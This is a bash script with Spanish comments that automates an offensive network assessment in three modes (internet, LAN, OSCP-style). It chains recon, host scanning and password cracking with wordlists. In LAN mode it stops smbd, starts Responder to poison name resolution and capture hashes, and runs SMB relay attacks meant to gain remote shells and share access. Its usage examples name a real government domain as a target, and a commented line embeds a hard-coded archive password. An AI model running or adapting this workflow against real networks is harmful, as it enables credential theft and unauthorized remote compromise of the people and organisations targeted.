#!/bin/bash
OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
RESET='\e[0m'
#bash-obfuscate discover-original.sh -o discover.sh

while getopts ":d:n:t:k:m:i:s:" OPTIONS
do
            case $OPTIONS in            
            d)     DOMAIN=$OPTARG;;
            n)     NOMBRE=$OPTARG;;
            k)     KEYWORD=$OPTARG;;
            t)     TYPE=$OPTARG;;
            i)     IP_LIST_FILE=$OPTARG;;
            s)     SUBNET_FILE=$OPTARG;;            
            ?)     printf "Opcion invalida: -$OPTARG\n" $0
                          exit 2;;
           esac
done

TYPE=${TYPE:=NULL} #internet/lan/oscp
DOMAIN=${DOMAIN:=NULL}
SUBNET_FILE=${SUBNET_FILE:=NULL} # lista de subredes
IP_LIST_FILE=${IP_LIST_FILE:=NULL} # lista de IPs
KEYWORD=${KEYWORD:=NULL} # nombre de la entidad
echo "TYPE $TYPE"
#if [ "$KEYWORD" == NULL ] || [ "$DOMAIN" == NULL ] &&  [ "$TYPE" != 'oscp' ]; then
#if [ "$TYPE" == NULL ] || [ "$DOMAIN" == NULL ]; then
if [ "$TYPE" == NULL ]; then

cat << "EOF"

Opciones: 

-c : palabra KEYWORD para generar passwords
-d : dominio

Ejemplo 1: Escanear el listado de subredes (completo)
    discover.sh -t oscp -d htb.local -i ips.txt 
	discover.sh -t lan -d htb.local -k agetic -i ips.txt 
	discover.sh -t lan -d htb.local -k agetic  -s subnet.txt
	discover.sh -t internet -d agetic.gob.bo -k agetic 
	discover.sh -t oscp -d htb.local -i ips.txt 
	
EOF

exit
fi



######################
if [ $TYPE == "internet" ]; then 	
	mkdir INTERNO
	mkdir EXTERNO
	cd EXTERNO
	echo -e "[+] Lanzando monitor $RESET" 
	xterm -hold -e monitor.sh 2>/dev/null&
	recon.sh -d $DOMAIN -k $KEYWORD
	cd $DOMAIN
	lanscanner.sh -m normal -i $IP_LIST_FILE -d $DOMAIN
	cracker.sh -e $KEYWORD
fi

if [ $TYPE == "oscp" ]; then 	
	#cd EXTERNO
	echo -e "[+] Lanzando monitor $RESET" 
	if [ $SUBNET_FILE != NULL ] ; then
		sub=`cat $SUBNET_FILE| head -1`
		num_targets='prips $sub | wc -l'
		echo "num_targets $num_targets"
		xterm -hold -e monitor.sh $num_targets 2>/dev/null&
	fi

	if [ $IP_LIST_FILE != NULL ] ; then
		num_targets=$((`wc -l $IP_LIST_FILE | awk '{print $1}'`*2))		 
		echo "num_targets $num_targets"
		xterm -hold -e monitor.sh $num_targets 2>/dev/null&
	fi
	
	
	lanscanner.sh -m extended -i $IP_LIST_FILE -s $SUBNET_FILE
	directory=`ls -hlt | grep '^d' | head -1 | awk '{print $9}'`
	echo "entrando al directorio $directory" # creado por lanscanner
	cd $directory
	cracker.sh -d /usr/share/wordlists/top200.txt
	#cracker.sh -d /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -t completo	
fi

if [ $TYPE == "lan" ]; then 	
	# escaneo LAN
	
	echo -e "$OKBLUE Iniciando Responder $RESET"	
	iface=`ip addr | grep -iv DOWN | awk '/UP/ {print $2}' | egrep -v "lo|dummy|rmnet|vmnet" | sed 's/.$//'`
	#Borrar logs pasados
	#rm /usr/bin/pentest/Responder/logs/* 2>/dev/null
	/etc/init.d/smbd stop 
	cp /usr/bin/pentest/Responder/Responder.conf.normal /usr/bin/pentest/Responder/Responder.conf
	xterm -hold -e responder.sh -F -f -I $iface 2>/dev/null& 	
	
		
	if [ "$SUBNET_FILE" != NULL ]; then 	
	
		lanscanner.sh -m normal -s $SUBNET_FILE -d $DOMAIN
		
		directory=`ls -hlt | grep '^d' | head -1 | awk '{print $9}'`
		pwd
		echo "entrando al directorio $directory" # creado por lanscanner
		cd $directory
		cracker.sh -e $KEYWORD
		
	fi
	if [ "$IP_LIST_FILE" != NULL ]; then 	
	
		lanscanner.sh -m normal -i $IP_LIST_FILE -d $DOMAIN				
		directory=`ls -hlt | grep '^d' | head -1 | awk '{print $9}'`
		echo "entrando al directorio $directory" # creado por lanscanner
		cd $directory
		cracker.sh -e $KEYWORD
	fi
	
	mv /usr/bin/pentest/Responder/logs/* `pwd`/responder 2>/dev/null

	########  SMBRelay 32 bits #########
	echo -e "\t[+] Testeando SMBRelay (shell - 32 bits)"
	killall xterm
	pwd
	smbrelay.sh -t shell32bits &
	sleep 600	
	# Matar responder, puede causar problemas de red
	kill -9 `ps aux | grep -i responder.sh| head -1 | awk '{print $2}'`
	kill -9 `ps aux | grep -i ntlmrelayx.py| head -1 | awk '{print $2}'`
	kill -9 `ps aux | grep -i configweb.sh| head -1 | awk '{print $2}'`
	sleep 10

	########  SMBRelay 64 bits #########
	echo -e "\t[+] Testeando SMBRelay (shell - 64 bits)"	
	pwd
	smbrelay.sh -t shell64bits &
	sleep 600	
	# Matar responder, puede causar problemas de red
	kill -9 `ps aux | grep -i responder.sh| head -1 | awk '{print $2}'`
	kill -9 `ps aux | grep -i ntlmrelayx.py| head -1 | awk '{print $2}'`
	kill -9 `ps aux | grep -i configweb.sh| head -1 | awk '{print $2}'`
	sleep 10
	
	########  SHARE #########
	echo -e "\t[+] Testeando SMBRelay (shares)"	
	pwd
	smbrelay.sh -t share &
	sleep 600	
	# Matar responder, puede causar problemas de red
	kill -9 `ps aux | grep -i responder.sh| head -1 | awk '{print $2}'`
fi

#Encritar resultados
#7z a .resultados.7z .resultados.db -pcANRHPeREPZsCYGB8L64 >/dev/null
#rm .resultados.db

